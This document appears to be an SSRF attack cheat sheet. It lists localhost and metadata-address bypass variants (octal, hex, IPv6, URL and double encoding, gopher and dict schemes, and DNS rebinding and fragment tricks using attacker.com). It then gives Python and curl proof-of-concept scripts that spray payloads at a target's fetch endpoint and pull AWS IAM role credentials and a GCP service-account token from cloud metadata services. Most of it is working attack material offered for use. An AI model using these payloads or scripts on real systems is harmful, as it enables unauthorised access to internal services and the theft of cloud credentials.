## Localhost Bypass

### Standard Localhost
http://localhost/admin
http://127.0.0.1/admin
http://0/admin (some systems)
http://0.0.0.0/admin

### Octal Notation
http://0177.0.0.1/admin (127.0.0.1 in octal)

### Hex Notation
http://0x7f.0x0.0x0.0x1/admin (127.0.0.1 in hex)
http://2130706433/admin (127.0.0.1 as integer)

### IPv6
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin

### Domain Name Tricks
http://localhost./admin
http://127.0.0.1./admin
http://127.0.0.1:80@attacker.com/admin (auth bypass)

### DNS Rebinding
attacker.com resolves to 127.0.0.1 on second lookup
Payload: http://attacker.com/admin

## Filtering Bypass Techniques

### URL Encoding
Standard: http://localhost/
Bypass: http://%6c%6f%63%61%6c%68%6f%73%74/
Bypass: http://127.0.0.1/ → http://127%2e0%2e0%2e1/

### Double Encoding
http://169.254.169.254/ → http://169%252e254%252e169%252e254/

### Null Byte Injection (older systems)
http://localhost%00attacker.com/

### Protocol Switching
http://localhost/ → https://localhost/
gopher://localhost/
dict://localhost/

### Port Variation
http://localhost:80/
http://localhost:8080/
http://localhost:3306/ (MySQL)
http://localhost:5432/ (PostgreSQL)

### Case Variation
http://LOCALHOST/
http://LoCalHost/

### Fragment/Query Bypass
http://attacker.com#http://localhost/
http://localhost/?url=http://attacker.com

## Proof of Concept

### Basic SSRF Test
```python
import requests

target = "https://target.com/api/fetch?url="

ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/admin",
    "http://127.0.0.1/admin",
    "http://[::1]/admin",
    "http://0/admin",
]

for payload in ssrf_payloads:
    try:
        r = requests.get(target + payload, timeout=5, verify=False)
        print(f"[Found] Payload: {payload}")
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text[:200]}")
        print("---")
    except Exception as e:
        print(f"[Error] {payload}: {e}")
```

### AWS Metadata Extraction
```python
import requests

target = "https://target.com/api/fetch?url="

# List available roles
roles_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
r = requests.get(target + roles_url, timeout=5, verify=False)
print("Available roles:", r.text)

# Get credentials for each role
role_name = r.text.split()[0]
creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
r = requests.get(target + creds_url, timeout=5, verify=False)
print("Credentials:", r.text)
```

### GCP Metadata Extraction (requires token)
```bash
# Step 1: Fetch token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.googleapis.com/")

# Step 2: Use token for API access
curl -s -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/compute/v1/projects/[PROJECT_ID]/zones/[ZONE]/instances
```
